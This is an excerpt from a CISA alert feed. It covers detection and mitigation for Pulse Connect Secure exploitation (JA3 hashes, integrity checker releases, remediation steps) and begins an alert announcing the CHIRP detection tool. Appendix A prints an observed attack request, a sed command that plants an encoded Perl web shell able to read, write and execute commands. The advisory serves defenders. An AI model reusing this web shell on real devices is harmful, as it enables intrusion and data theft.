&lt;p&gt;During the course of analysis, it is possible that a network defender may be able to reveal illegitimate connections from users that are masquerading as legitimate users from different geolocations. CISA has noted IPs associated with malicious webshell interaction from a threat actor—associated with a single username—in both the authenticated and the unauthenticated logs at the same time. The geo-location for the two IP addresses was sufficiently far that impossible travel calculations could detect the threat actor IP address.&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;(Updated April 30, 2021): TLS Fingerprinting&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;Transport Layer Security (TLS) fingerprinting may also be useful in identifying malicious activity. CISA has noted re-use of various JA3 hashes including JA3 hashes that align with Chrome, Firefox, and others. Caution should be taken when using TLS fingerprinting because the majority of the JA3 hashes observed in connection with Pulse Connect Secure exploitation were not unique to malicious activity. The same JA3 hashes—and the software they characterize—are often used for benign activity, vulnerability scanning, etc. Overlap in JA3 hashes cannot be considered a high-fidelity indicator of malicious activity, let alone successful exploitation. Connections made via JA3 must be corroborated with other data points.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;A common observation is that the TLS connections frequently exclude the Server Name Indication (SNI) extension, which is relatively rare in most environments where users connect to Domain Name Server (DNS) host names (but is commonly observed in scanning). It is believed this is an artifact of attackers browsing direct to IP addresses instead of host names.&lt;/li&gt;
	&lt;li&gt;The JA3 hashes in table 2 below have been observed in connection with a pulse secure exploitation. &lt;strong&gt;Note:&lt;/strong&gt; there may be many User-Agents associated with a given JA3 (often due to User-Agent spoofing) and the prevalence of a given JA3 necessarily differs by environment. The prevalence column of table 2 refers to how often the specific JA3 hash was observed in the dataset that was being analyzed. Some hashes are rarely observed in the dataset and the information is provided for context only. Analytical conclusions should not be made solely based on this reporting. The prevalence of a JA3 hash observed in an environment would need to be further evaluated.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 2: JA3 MD5 hashes and associated prevalence/user-agent&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;JA3 Hash&lt;/th&gt;
			&lt;th scope="col"&gt;User-Agent&lt;/th&gt;
			&lt;th scope="col"&gt;Prevalence&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;227ab2ae6ed6abcc249e8a873a033144&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Firefox (~68-71)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;30017f6f809155387cbcf95be6e7225d&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;(UA header frequently not set)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;3cbc88eabdac9af71445f9040a6cf46c&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Chrome (~50-57)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;53829d58e2631a372bb4de1be2cbecca&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Chrome (~51-81)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;714cdf6e462870e2b85d251a3b22064b&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Firefox (~65-68)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;86cb13d6bbb3ac96b78b408bcfc18794&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Python-requests, many others&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;common (but rare when used with pulse secure)&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;8f6747b71d1003df1b7e3e8232b1a7e3&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Chrome (~89)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;916e458922ae9a1bab6b1154689c7de7&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Firefox (~60-86)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;a29d0d294a6236b5bf0ec2573dd4f02f&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Firefox (~77-87), Chrome (~78-90), others&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;af26ba5e85475b634275141e6ed3dc54&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Python-requests, many others&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;b592adaa596bb72a5c1ccdbecae52e3f&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Chrome (~79-90)&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;rare&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;
			&lt;p&gt;c12f54a3f91dc7bafd92cb59fe009a35&lt;/p&gt;
			&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Office, many others&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;very rare&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;/o1&gt;&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;(&lt;em&gt;Updated May 3, 2021&lt;/em&gt;)&lt;/strong&gt;&amp;nbsp;CISA strongly urges organizations using Pulse Secure devices to immediately:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Review the &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect Integrity Tool Quick Start Guide&lt;/a&gt; and &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44764"&gt;Customer FAQs&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Run the &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect Integrity&amp;nbsp;Tool&lt;/a&gt;.
	&lt;ul&gt;
		&lt;li&gt;The tool requires a reboot.&lt;/li&gt;
		&lt;li&gt;If virtualized, take a snapshot before running.&lt;/li&gt;
		&lt;li&gt;If the appliance is physical, consider the consequences of rebooting and running the tool and contact Ivanti for assistance or questions.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;(&lt;em&gt;Updated May 3, 2021&lt;/em&gt;)&lt;/strong&gt;&amp;nbsp;&lt;s&gt;Continue to run the tool daily until the XML mitigations have been implemented or the patch has been deployed.&lt;/s&gt;&amp;nbsp;&lt;strong&gt;Note:&lt;/strong&gt; the Pulse Secure team released &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/SA44784/"&gt;Security Advisory SA44784&lt;/a&gt;&amp;nbsp;that addresses &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22893"&gt;CVE-2021-22893&lt;/a&gt;, CVE-2021-22984, CVE-2021-22899, and CVE-2021-22900 with patches.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;s&gt;Implement the mitigations released by the vendor. According Ivanti Pulse Secure, the interim XML configurations listed in the "Workaround" section of &lt;a href="https://kb.pulsesecure.net/pkb_mobile#article/l:en_US/SA44784/s"&gt;SA44784 - 2021-04: Out-of-Cycle Advisory: Pulse Connect Secure RCE Vulnerability (CVE-2021-22893)&lt;/a&gt; provide significant protection against threat actor activity.&lt;/s&gt;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;(&lt;em&gt;Updated May 3, 2021&lt;/em&gt;)&lt;/strong&gt;&amp;nbsp;Update to the latest software version.&lt;s&gt;, per the process outlined on Ivanti Pulse Secure’s website which contains security enhancements.&lt;/s&gt;&lt;/li&gt;
	&lt;li&gt;&lt;em&gt;&lt;strong&gt;(Updated May 27, 2021)&lt;/strong&gt;&lt;/em&gt; Using the Pulse Secure Integrity Checker. The Integrity Checker Tool (ICT) helps system owners understand if their Pulse Secure Connect device has been compromised. While the tool is accurate, there are several nuances&amp;nbsp;to its effective use.
	&lt;ul&gt;
		&lt;li&gt;The ICT detects evidence of adversary cleanup only on the current, running version of PCS.&lt;/li&gt;
		&lt;li&gt;It may be necessary to roll back the current PCS version to have a valid run of the ICT.&lt;/li&gt;
		&lt;li&gt;During the upgrade process, the active version becomes a rollback partition.&lt;/li&gt;
		&lt;li&gt;Only one rollback partition exists on a device, as the rollback partition is replaced on each update.&lt;/li&gt;
		&lt;li&gt;Therefore, if an entity has updated their PCS device without running the correct version of the ICT (as outlined in Appendix B), anomalous activity will not be detected.&lt;br /&gt;
		&amp;nbsp;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If the Integrity Checker Tools finds mismatched or unauthorized files, CISA urges organizations to:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Contact CISA to report your findings (see Contact Information section below).&lt;/li&gt;
	&lt;li&gt;Contact &lt;a href="https://support.pulsesecure.net/support/support-contacts/"&gt;Ivanti Pulse Secure&lt;/a&gt; for assistance in capturing forensic information.&lt;/li&gt;
	&lt;li&gt;Review “Unauthenticated Web Requests” log for evidence of exploitation, if enabled.&lt;/li&gt;
	&lt;li&gt;Change all passwords associated with accounts passing through the Pulse Secure environment (including user accounts, service accounts, administrative accounts and any accounts that could be modified by any account described above, all of these accounts should be assumed to be compromised). &lt;strong&gt;Note: &lt;/strong&gt;Unless an exhaustive password reset occurs, factory resetting a Pulse Connect Secure appliance (see Step 3 below) will only remove malicious code from the device, and may not remove the threat actor from the environment. The threat actor may use the credentials harvested to regain access even after the appliance is fully patched.&lt;/li&gt;
	&lt;li&gt;Review logs for any unauthorized authentications originating from the Pulse Connect Secure appliance IP address or the DHCP lease range of the Pulse Connect Secure appliance's VPN lease pool.&lt;/li&gt;
	&lt;li&gt;&lt;em&gt;&lt;strong&gt;(Updated May 27, 2021)&lt;/strong&gt;&amp;nbsp;&lt;/em&gt;&lt;strong&gt;Note: &lt;/strong&gt;adversary activity may not be easily identifiable on your network as it may appear as a normal user traffic.&amp;nbsp;If a device has been compromised, entities should take all precautions as if the adversary has intruded past the device into your network and take steps to ensure there are no further signs of an intrusion into networks that include:
	&lt;ul&gt;
		&lt;li&gt;Look for unauthorized applications and scheduled tasks in environments.&amp;nbsp;&lt;/li&gt;
		&lt;li&gt;Ensure no new administrators were created.&lt;/li&gt;
		&lt;li&gt;Ensure non-privileged users were not added to privileged groups.&lt;/li&gt;
		&lt;li&gt;Scrutinize and monitor all accounts with domain administrator privileges.&amp;nbsp;&lt;/li&gt;
		&lt;li&gt;Monitor domain administrator accounts to ensure they&amp;nbsp;are only accessing the part of the network they are authorized to access.&amp;nbsp;&lt;/li&gt;
		&lt;li&gt;Check all accounts should be checked to ensure they have the proper level of privileges and have not been altered such as increased privileges.&amp;nbsp;&lt;/li&gt;
		&lt;li&gt;Remove any remote access programs not approved by the organization.&lt;/li&gt;
		&lt;li&gt;Carefully inspect scheduled tasks for scripts or executables that may allow a threat actor to connect to an environment.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In addition to the recommendations above, organizations that find evidence of malicious, suspicious, or anomalous activity or files, should consider the guidance in &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44764"&gt;KB44764 - Customer FAQ: PCS Security Integrity Tool Enhancements&lt;/a&gt;, which includes:&lt;/p&gt;

&lt;p&gt;After preservation, you can remediate your Pulse Connect Secure appliance by:&amp;nbsp;&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;Disabling the external-facing interface. &amp;nbsp;&lt;/li&gt;
	&lt;li&gt;Saving the system and user config.&lt;/li&gt;
	&lt;li&gt;Performing a factory reset via the Serial Console. &lt;strong&gt;Note: &lt;/strong&gt;For more information refer to &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB22964/?kA1j0000000FjFj"&gt;KB22964&lt;/a&gt; (How to reset a PCS device to the factory default setting via the serial console)&lt;/li&gt;
	&lt;li&gt;Updating the appliance to the newest version.&lt;/li&gt;
	&lt;li&gt;Re-importing the saved config.&amp;nbsp; &amp;nbsp;&lt;/li&gt;
	&lt;li&gt;Re-enabling the external interface.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;CISA recommends performing checks to ensure any infection is remediated, even if the workstation or host has been reimaged. These checks should include running the &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect Integrity&amp;nbsp;Tool&lt;/a&gt; again after remediation has been taken place.&lt;/p&gt;

&lt;p&gt;CISA would like to thank Ivanti for their contributions to this Alert.&lt;/p&gt;
&lt;h3&gt;Contact Information&lt;/h3&gt;&lt;p&gt;CISA encourages recipients of this report to contribute any additional information that they may have related to this threat. For any questions related to this report, please contact CISA at&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;1-888-282-0870 (From outside the United States: +1-703-235-8832)&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.cisa.govmailto:Central@cisa.dhs.gov"&gt;central@cisa.dhs.gov &lt;/a&gt;(UNCLASS)&lt;/li&gt;
	&lt;li&gt;us-cert@dhs.sgov.gov (SIPRNET)&lt;/li&gt;
	&lt;li&gt;us-cert@dhs.ic.gov (JWICS)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on the CISA/US-CERT homepage at &lt;a href="http://www.us-cert.cisa.gov/"&gt;http://www.us-cert.cisa.gov/&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;Appendix A: Large sed Command Found In Unauthenticated Logs&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;Unauthenticated request url /dana-na/[redacted]?id=sed%20-i%20%22/main();/cuse%20MIME::Base64;use%20Crypt::RC4;my%20[redacted];sub%20r{my%20\$n=\$_[0];my%20\$rs;for%20(my%20\$i=0;\$i%3C\$n;\$i++){my%20\$n1=int(rand(256));\$rs.=chr(\$n1);}return%20\$rs;}sub%20a{my%20\$st=\$_[0];my%20\$k=r([redacted]);my%20\$en%20=%20RC4(%20\$k.\$ph,%20\$st);return%20encode_base64(\$k.\$en);}sub%20b{my%20\$s=%20decode_base64(\$_[0]);%20my%20\$l=length(\$s);my%20\$k=%20substr(\$s,0,[redacted]);my%20\$en=substr(\$s,[redacted],\$l-[redacted]);my%20\$de%20=%20RC4(%20\$k.\$ph,%20\$en%20);return%20\$de;}sub%20c{my%20\$fi=CGI::param(%27img%27);my%20\$FN=b(\$fi);my%20\$fd;print%20\%22Content-type:%20application/x-download\\n\%22;open(*FILE,%20\%22%3C\$FN\%22%20);while(%3CFILE%3E){\$fd=\$fd.\$_;}close(*FILE);print%20\%22Content-Disposition:%20attachment;%20filename=tmp\\n\\n\%22;print%20a(\$fd);}sub%20d{print%20\%22Cache-Control:%20no-cache\\n\%22;print%20\%22Content-type:%20text/html\\n\\n\%22;my%20\$fi%20=%20CGI::param(%27cert%27);\$fi=b(\$fi);my%20\$pa=CGI::param(%27md5%27);\$pa=b(\$pa);open%20(*outfile,%20\%22%3E\$pa\%22);print%20outfile%20\$fi;close%20(*outfile);}sub%20e{print%20\%22Cache-Control:%20no-cache\\n\%22;print%20\%22Content-type:%20image/gif\\n\\n\%22;my%20\$na=CGI::param(%27name%27);\$na=b(\$na);my%20\$rt;if%20(!\$na%20or%20\$na%20eq%20\%22cd\%22)%20{\$rt=\%22Error%20404\%22;}else%20{my%20\$ot=\%22/tmp/1\%22;system(\%22\$na%20%3E/tmp/1%202%3E&amp;amp;1\%22);open(*cmd_result,\%22%3C\$ot\%22);while(%3Ccmd_result%3E){\$rt=\$rt.\$_;}close(*cmd_result);unlink%20\$ot}%20%20print%20a(\$rt);}sub%20f{if(CGI::param(%27cert%27)){d();}elsif(CGI::param(%27img%27)%20and%20CGI::param(%27name%27)){c();}elsif(CGI::param(%27name%27)%20and%20CGI::param(%27img%27)%20eq%20\%22\%22){e();}else{%20%20%20&amp;amp;main();}}if%20(\$ENV{%27REQUEST_METHOD%27}%20eq%20\%22POST\%22){%20%20f();}else{&amp;amp;main();%20}%22%20/home/webserver/htdocs/dana-na/[redacted] came from IP XX.XX.XX.XX&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;Appendix B: ICT Releases&lt;/h3&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 3: ICT Releases&amp;nbsp;– releases are cumulative&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Release Package&amp;nbsp;&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 259px;"&gt;&lt;strong&gt;Supported Versions (n+1 always supports nth versions)&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 181px;"&gt;Release Date&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;package-integrity-checker-11951.1.pkg&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 259px;"&gt;
			&lt;ul&gt;
				&lt;li class="text-align-left"&gt;8.3R7.1 (build 65025)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R7 (build 6567)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R8 (build 7453)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R8.1 (build 7851)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R8.2 (build 8511)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R9 (build 9189)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R9.1 (build 9701)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R10 (build 10119)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R11 (build 11161)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R11.1 (build 11915)&lt;/li&gt;
			&lt;/ul&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="width: 181px;"&gt;3/31/2021 (ICTv1 released to public on 3/31/2021) *Initial build&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;package-integrity-checker-12255.1.pkg&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 259px;"&gt;
			&lt;ul&gt;
				&lt;li class="text-align-left"&gt;9.1R8.4 (build 12177)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R9.2 (build 12181)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R10.2 (build 12179)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R11.3 (build 12173)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R1(build 1505)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R2 (build 2331)&amp;nbsp;&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R3 (build 3535)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R4 (build 4763)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R4.1 (build 4967)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R4.2 (build 5035)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R4.3 (build 5185)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R5 (build 5459)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R6 (build 5801)&lt;/li&gt;
			&lt;/ul&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="width: 181px;"&gt;4/17/2021 (ICTv2 released to public on 4/18/2021)&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;package-integrity-checker-12363.1.pkg&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 259px;"&gt;
			&lt;ul&gt;
				&lt;li class="text-align-left"&gt;9.1R11.3:HF1(build 12235)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R9.1HF1 (build 10625.1)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R11.1HF1(build 12049.1)&lt;/li&gt;
				&lt;li class="text-align-left"&gt;9.1R11.4 (build 12319)&lt;/li&gt;
			&lt;/ul&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="width: 181px;"&gt;5/3/2021 (ICTv3 released to public on 5/3/2021)&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"&gt;FireEye blog: Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.kb.cert.org/vuls/id/213092"&gt;CERT/CC Vulnerability Note VU#213092 Pulse Connect Secure vulnerable to authentication bypass&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;April 20, 2021: Initial version&lt;/li&gt;			            &lt;li&gt;April 21, 2021: Added CERT/CC Vulnerability Note to References&lt;/li&gt;			            &lt;li&gt;April 26, 2021: Added IOC STIX File&lt;/li&gt;			            &lt;li&gt;April 30, 2021: Replaced IOC STIX File; Added new Detection Section&lt;/li&gt;			            &lt;li&gt;May 3, 2021: Added Ivanti Security Update Information&lt;/li&gt;			            &lt;li&gt;May 27, 2021: Added additional technical details and Appendix B&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Tue, 20 Apr 2021 15:03:59 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16487 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-077A: Detecting Post-Compromise Threat Activity Using the CHIRP IOC Detection Tool</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-077a</link>
	<description>Original release date: March 18, 2021 | Last revised: April 15, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Updated April 15, 2021: The U.S. Government attributes this activity to the Russian Foreign Intelligence Service (SVR). Additional information may be found in a &lt;a href="https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/15/fact-sheet-imposing-costs-for-harmful-foreign-activities-by-the-russian-government/"&gt;statement from the White House&lt;/a&gt;. For more information on SolarWinds-related activity, go to &lt;a href="https://us-cert.cisa.gov/remediating-apt-compromised-networks"&gt;https://us-cert.cisa.gov/remediating-apt-compromised-networks&lt;/a&gt; and &lt;a href="https://www.cisa.gov/supply-chain-compromise"&gt;https://www.cisa.gov/supply-chain-compromise&lt;/a&gt;.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This Alert announces the CISA Hunt and Incident Response Program (CHIRP) tool. CHIRP is a forensics collection tool that CISA developed to help network defenders find indicators of compromise (IOCs) associated with activity detailed in the following CISA Alerts:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;AA20-352A: &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-352a"&gt;Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations&lt;/a&gt;, which primarily focuses on an advanced persistent threat (APT) actor’s compromise of SolarWinds Orion products affecting U.S. government agencies, critical infrastructure entities, and private network organizations.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
	&lt;li&gt;AA21-008A: &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa21-008a"&gt;Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments&lt;/a&gt;, which addresses APT activity within Microsoft 365/Azure environments and offers an overview of—and guidance on—available open-source tools. The Alert includes the &lt;a href="https://github.com/cisagov/Sparrow"&gt;CISA-developed Sparrow tool &lt;/a&gt;that helps network defenders detect possible compromised accounts and applications in the Azure/M365 environment.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Similar to &lt;a href="https://github.com/cisagov/Sparrow"&gt;Sparrow&lt;/a&gt;—which scans for signs of APT compromise within an M365 or Azure environment—CHIRP scans for signs of APT compromise within an on-premises environment.&lt;/p&gt;

&lt;p&gt;In this release, CHIRP, by default, searches for IOCs associated with malicious activity detailed in AA20-352A and AA21-008A that has spilled into an on-premises enterprise environment.&lt;/p&gt;

&lt;p&gt;CHIRP is freely available on the &lt;a href="https://github.com/cisagov"&gt;CISA GitHub Repository&lt;/a&gt;. For additional guidance watch CISA's &lt;a href="https://www.youtube.com/watch?v=UGYSNiNOpds"&gt;CHIRP Overview video&lt;/a&gt;.&amp;nbsp;&lt;strong&gt;Note:&lt;/strong&gt; CISA will continue to release plugins and IOC packages for new threats via the CISA GitHub Repository.&lt;/p&gt;

&lt;p&gt;CISA advises organizations to use CHIRP to:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Examine Windows event logs for artifacts associated with this activity;&lt;/li&gt;
	&lt;li&gt;Examine Windows Registry for evidence of intrusion;&lt;/li&gt;
	&lt;li&gt;Query Windows network artifacts; and&lt;/li&gt;
	&lt;li&gt;Apply YARA rules to detect malware, backdoors, or implants.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Network defenders should review and confirm any post-compromise threat activity detected by the tool. CISA has provided confidence scores for each IOC and YARA rule included with CHIRP’s release. For confirmed positive hits, CISA recommends collecting a forensic image of the relevant system(s) and conducting a forensic analysis on the system(s).&lt;/p&gt;

&lt;p&gt;If an organization does not have the capability to follow the guidance in this Alert, consider soliciting third-party IT security support. &lt;strong&gt;Note&lt;/strong&gt;: Responding to confirmed positive hits is essential to evict an adversary from a compromised network.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-077A-Detecting_Post-Compromise_Threat_Activity_Using_CHIRP_508.pdf"&gt;Click here&lt;/a&gt; for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;h4&gt;How CHIRP Works&lt;/h4&gt;

&lt;p&gt;CHIRP is a command-line executable with a dynamic plugin and indicator system to search for signs of compromise. CHIRP has plugins to search through event logs and registry keys and run YARA rules to scan for signs of APT tactics, techniques, and procedures. CHIRP also has a YAML file that contains a list of IOCs that CISA associates with the malware and APT activity detailed in CISA Alerts &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-352a"&gt;AA20-352A&lt;/a&gt; and &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa21-008a"&gt;AA21-008A&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Currently, the tool looks for:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;The presence of malware identified by security researchers as &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-039b"&gt;TEARDROP&lt;/a&gt; and RAINDROP;&lt;/li&gt;
	&lt;li&gt;Credential dumping certificate pulls;&lt;/li&gt;
	&lt;li&gt;Certain persistence mechanisms identified as associated with this campaign;&lt;/li&gt;
	&lt;li&gt;System, network, and M365 enumeration; and&lt;/li&gt;
	&lt;li&gt;Known observable indicators of lateral movement.&lt;/li&gt;
